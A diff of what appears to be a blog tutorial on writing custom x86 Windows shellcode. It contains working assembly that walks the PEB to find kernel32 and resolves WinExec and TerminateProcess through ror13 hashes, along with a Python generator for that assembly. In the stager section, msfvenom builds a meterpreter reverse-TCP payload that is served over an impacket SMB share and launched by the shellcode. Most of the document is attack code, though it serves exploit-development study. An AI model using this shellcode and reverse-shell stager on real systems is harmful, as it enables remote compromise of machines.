@@ -79,12 +79,12 @@ The asm below walks the module chain until it finds one whose name is exactly 12
 ```nasm
 find_kernel32:
     xor ecx,ecx                     ; ecx = 0
-    mov esi,fs:[ecx+30h]            ; esi = &(PEB) ([FS:0x30])
-    mov esi,[esi+0Ch]               ; esi = PEB->Ldr
-    mov esi,[esi+1Ch]               ; esi = PEB->Ldr.InInitOrder
+    mov esi,fs:[ecx+0x30]           ; esi = &(PEB) ([FS:0x30])
+    mov esi,[esi+0x0C]              ; esi = PEB->Ldr
+    mov esi,[esi+0x1C]              ; esi = PEB->Ldr.InInitOrder
 next_module:
-    mov ebx, [esi+8h]               ; ebx = InInitOrder[X].base_address
-    mov edi, [esi+20h]              ; edi = InInitOrder[X].module_name
+    mov ebx, [esi+0x8]              ; ebx = InInitOrder[X].base_address
+    mov edi, [esi+0x20]             ; edi = InInitOrder[X].module_name
     mov esi, [esi]                  ; esi = InInitOrder[X].flink (next)
     cmp [edi+12*2], cx              ; (unicode) modulename[12] == 0x00?
     jne next_module                 ; No? try next module.
@@ -360,11 +360,10 @@ Now we resolve the functions we actually want, using the resolver plus the ror13
 ```nasm
 resolve_symbols:
     push 0x0E8AFE98                 ; ror13 hash of "WinExec"
-    call dword ptr [ebp-0x08]       ; find_function
-    mov  [ebp-0x0C], eax            ; save WinExec
+    call dword ptr [ebp - 0x08]     ; find_function
+    mov  [ebp - 0x0C], eax          ; save WinExec
 ```
 
-Note that `ebx` is the dll base the resolver walks. After the module walk it still holds `kernel32`, so `WinExec` resolves first, no setup needed. 
 
 Then we save each pointer at a different offset from `ebp` for future reference. All negative offsets: that's the ~1.5KB of room we reserved in [step 0](#step-0-reserve-stack-space) doing its job.
 
@@ -478,7 +477,7 @@ exec_shellcode:
     xor ecx, ecx                    ; null ECX
     push ecx                        ; uExitCode
     push 0xffffffff                 ; hProcess
-    call dword ptr [ebp+0x10]       ; Call TerminateProcess
+    call dword ptr [ebp - 0x10]     ; Call TerminateProcess
 ```
 
 ## final code
@@ -569,88 +568,88 @@ def exec_cmd(command, breakpoint=0):
     asm = [
         "   start:                               ",
         f"{['', 'int3;'][breakpoint]}            ",
-        "       mov ebp, esp                    ;",  #
-        "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
+        "       mov ebp, esp                     ;",
+        "       add esp, 0xfffff9f0              ;",  # avoid NULL bytes
         "   find_kernel32:                       ",
-        "       xor ecx,ecx                     ;",  # ECX = 0
-        "       mov esi,fs:[ecx+30h]            ;",  # ESI = &(PEB) ([FS:0x30])
-        "       mov esi,[esi+0Ch]               ;",  # ESI = PEB->Ldr
-        "       mov esi,[esi+1Ch]               ;",  # ESI = PEB->Ldr.InInitOrder
+        "       xor ecx, ecx                     ;",  # ECX = 0
+        "       mov esi, fs:[ecx + 0x30]         ;",  # ESI = PEB ([FS:0x30])
+        "       mov esi, [esi + 0x0C]            ;",  # ESI = PEB->Ldr
+        "       mov esi, [esi + 0x1C]            ;",  # ESI = PEB->Ldr.InInitOrder
         "   next_module:                         ",
-        "       mov ebx, [esi+8h]               ;",  # EBX = InInitOrder[X].base_address
-        "       mov edi, [esi+20h]              ;",  # EDI = InInitOrder[X].module_name
-        "       mov esi, [esi]                  ;",  # ESI = InInitOrder[X].flink (next)
-        "       cmp [edi+12*2], cx              ;",  # (unicode) modulename[12] == 0x00?
-        "       jne next_module                 ;",  # No: try next module.
+        "       mov ebx, [esi + 0x08]            ;",  # EBX = InInitOrder[X].base
+        "       mov edi, [esi + 0x20]            ;",  # EDI = InInitOrder[X].name
+        "       mov esi, [esi]                   ;",  # ESI = next entry
+        "       cmp word ptr [edi + 12*2], cx    ;",  # name[12] == 0x0000? (kernel32.dll)
+        "       jne next_module                  ;",  # no: try next module
         "   find_function_shorten:               ",
-        "       jmp find_function_shorten_bnc   ;",  # Short jump
+        "       jmp find_function_shorten_bnc    ;",  # short jump
         "   find_function_ret:                   ",
-        "       pop esi                         ;",  # POP the return address from the stack
-        "       mov [ebp+0x04], esi             ;",  # Save find_function address for later usage
-        "       jmp resolve_symbols             ;",  #
+        "       pop esi                          ;",  # pop the pushed return address
+        "       mov [ebp - 0x08], esi            ;",  # save find_function for later
+        "       jmp resolve_symbols              ;",
         "   find_function_shorten_bnc:           ",
-        "       call find_function_ret          ;",  # Relative CALL with negative offset
+        "       call find_function_ret           ;",  # pushes address of next instruction
         "   find_function:                       ",
-        "       pushad                          ;",  # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
-        "       mov eax, [ebx+0x3c]             ;",  # Offset to PE Signature
-        "       mov edi, [ebx+eax+0x78]         ;",  # Export Table Directory RVA
-        "       add edi, ebx                    ;",  # Export Table Directory VMA
-        "       mov ecx, [edi+0x18]             ;",  # NumberOfNames
-        "       mov eax, [edi+0x20]             ;",  # AddressOfNames RVA
-        "       add eax, ebx                    ;",  # AddressOfNames VMA
-        "       mov [ebp-4], eax                ;",  # Save AddressOfNames VMA for later
+        "       pushad                           ;",  # save all registers (ebx = kernel32 base)
+        "       mov eax, [ebx + 0x3C]            ;",  # offset to PE signature
+        "       mov edi, [ebx + eax + 0x78]      ;",  # Export Table Directory RVA
+        "       add edi, ebx                     ;",  # Export Table Directory VMA
+        "       mov ecx, [edi + 0x18]            ;",  # NumberOfNames
+        "       mov eax, [edi + 0x20]            ;",  # AddressOfNames RVA
+        "       add eax, ebx                     ;",  # AddressOfNames VMA
+        "       mov [ebp - 4], eax               ;",  # save it for later
         "   find_function_loop:                  ",
-        "       jecxz find_function_finished    ;",  # Jump to the end if ECX is 0
-        "       dec ecx                         ;",  # Decrement our names counter
-        "       mov eax, [ebp-4]                ;",  # Restore AddressOfNames VMA
-        "       mov esi, [eax+ecx*4]            ;",  # Get the RVA of the symbol name
-        "       add esi, ebx                    ;",  # Set ESI to the VMA of the current
+        "       jecxz find_function_finished     ;",  # jump to the end if ECX is 0
+        "       dec ecx                          ;",  # decrement our names counter
+        "       mov eax, [ebp - 4]               ;",  # reload: eax is trashed below
+        "       mov esi, [eax + ecx*4]           ;",  # RVA of the ecx-th name
+        "       add esi, ebx                     ;",  # VMA of the name
         "   compute_hash:                        ",
-        "       xor eax, eax                    ;",  # NULL EAX
-        "       cdq                             ;",  # NULL EDX
-        "       cld                             ;",  # Clear direction
+        "       xor eax, eax                     ;",  # NULL EAX
+        "       cdq                              ;",  # NULL EDX
+        "       cld                              ;",  # clear direction
         "   compute_hash_again:                  ",
-        "       lodsb                           ;",  # Load the next byte from esi into al
-        "       test al, al                     ;",  # Check for NULL terminator
-        "       jz compute_hash_finished        ;",  # If the ZF is set, we've hit the NULL term
-        "       ror edx, 0x0d                   ;",  # Rotate edx 13 bits to the right
-        "       add edx, eax                    ;",  # Add the new byte to the accumulator
-        "       jmp compute_hash_again          ;",  # Next iteration
+        "       lodsb                            ;",  # load next byte from esi into al
+        "       test al, al                      ;",  # check for NULL terminator
+        "       jz compute_hash_finished         ;",
+        "       ror edx, 0x0D                    ;",  # rotate edx 13 bits right
+        "       add edx, eax                     ;",  # add the byte to the accumulator
+        "       jmp compute_hash_again           ;",
         "   compute_hash_finished:               ",
         "   find_function_compare:               ",
-        "       cmp edx, [esp+0x24]             ;",  # Compare the computed hash with the requested hash
-        "       jnz find_function_loop          ;",  # If it doesn't match go back to find_function_loop
-        "       mov edx, [edi+0x24]             ;",  # AddressOfNameOrdinals RVA
-        "       add edx, ebx                    ;",  # AddressOfNameOrdinals VMA
-        "       mov cx, [edx+2*ecx]             ;",  # Extrapolate the function's ordinal
-        "       mov edx, [edi+0x1c]             ;",  # AddressOfFunctions RVA
-        "       add edx, ebx                    ;",  # AddressOfFunctions VMA
-        "       mov eax, [edx+4*ecx]            ;",  # Get the function RVA
-        "       add eax, ebx                    ;",  # Get the function VMA
-        "       mov [esp+0x1c], eax             ;",  # Overwrite stack version of eax from pushad
+        "       cmp edx, [esp + 0x24]            ;",  # computed hash vs requested hash
+        "       jnz find_function_loop           ;",  # no match: next name
+        "       mov edx, [edi + 0x24]            ;",  # AddressOfNameOrdinals RVA
+        "       add edx, ebx                     ;",  # AddressOfNameOrdinals VMA
+        "       mov cx, [edx + 2*ecx]            ;",  # the function's ordinal
+        "       mov edx, [edi + 0x1C]            ;",  # AddressOfFunctions RVA
+        "       add edx, ebx                     ;",  # AddressOfFunctions VMA
+        "       mov eax, [edx + 4*ecx]           ;",  # function RVA
+        "       add eax, ebx                     ;",  # function VMA
+        "       mov [esp + 0x1C], eax            ;",  # overwrite saved eax from pushad
         "   find_function_finished:              ",
-        "       popad                           ;",  # Restore registers
-        "       ret                             ;",  
+        "       popad                            ;",  # restore registers
+        "       ret                              ;",
         "   resolve_symbols:                     ",
-        push_instr_winexec_hash,                     # kernel32!WinExec
-        "       call dword ptr [ebp - 0x08]      ;",
-        "       mov [ebp - 0x0C], eax            ;",
-        push_instr_terminate_hash,                   # TerminateProcess hash
-        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp - 0x10], eax             ;", # Save TerminateProcess address for later
+        push_instr_winexec_hash,                    # kernel32!WinExec
+        "       call dword ptr [ebp - 0x08]      ;",  # find_function
+        "       mov [ebp - 0x0C], eax            ;",  # save WinExec
+        push_instr_terminate_hash,                 # kernel32!TerminateProcess
+        "       call dword ptr [ebp - 0x08]      ;",  # find_function (ebx still = kernel32)
+        "       mov [ebp - 0x10], eax            ;",  # save TerminateProcess
         "   call_winexec:                        ",
         "       xor eax, eax                     ;",
-        "       push eax                         ;", # null terminator
+        "       push eax                         ;",  # null terminator
         push_instr_command,
-        "       mov eax, esp                     ;", # lpCmdLine
-        "       push 5                           ;", # uCmdShow (2nd arg pushed first)
-        "       push eax                         ;", # lpCmdLine (1st arg pushed last)
-        "       call dword ptr [ebp - 0x0C]      ;", # WinExec(lpCmdLine, uCmdShow)
+        "       mov eax, esp                     ;",  # lpCmdLine
+        "       push 5                           ;",  # uCmdShow (2nd arg pushed first)
+        "       push eax                         ;",  # lpCmdLine (1st arg pushed last)
+        "       call dword ptr [ebp - 0x0C]      ;",  # WinExec(lpCmdLine, uCmdShow)
         "   exec_shellcode:                      ",
         "       xor ecx, ecx                     ;",
-        "       push ecx                         ;", # uExitCode = 0
-        "       push 0xffffffff                  ;", # hProcess = -1 (current process)
-        "       call dword ptr [ebp - 0x10]      ;", # TerminateProcess(-1, 0)
+        "       push ecx                         ;",  # uExitCode = 0 (push 0 would embed a null!)
+        "       push 0xffffffff                  ;",  # hProcess = -1 (current process)
+        "       call dword ptr [ebp - 0x10]      ;",  # TerminateProcess(-1, 0)
     ]
 
     return "\n".join(asm)
@@ -728,17 +727,16 @@ As you may have noticed, I included the option to debug it directly from our win
 
 We could just run `calc.exe`, but that would be boring. So let's use it as a stager.
 
-First, create a meterpreter revshell for x86:
-```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f exe -a x86 -o rev.exe
-```
-
-Then, you host it via SMB like: 
-```bash
-sudo impacket-smbserver met /home/kali/shared -smb2support
-```
-
-Finally, use our script in debug mode to run the custom shellcode to trigger it from a shared folder, like this:
+1. create a meterpreter revshell for x86:
+    ```bash
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -a x86 -o rev.exe
+    ```
+2. setup a meterpreter listener.
+3. host the revshell via SMB like: 
+    ```bash
+    sudo impacket-smbserver met /home/kali/shared -smb2support
+    ```
+4. use our script in debug mode to run the custom shellcode to trigger it from a shared folder, like this:
 ![shellcode generator calc](/assets/img/shell-stager.png)
 
 OMG! It's alive! 🧟‍♂️
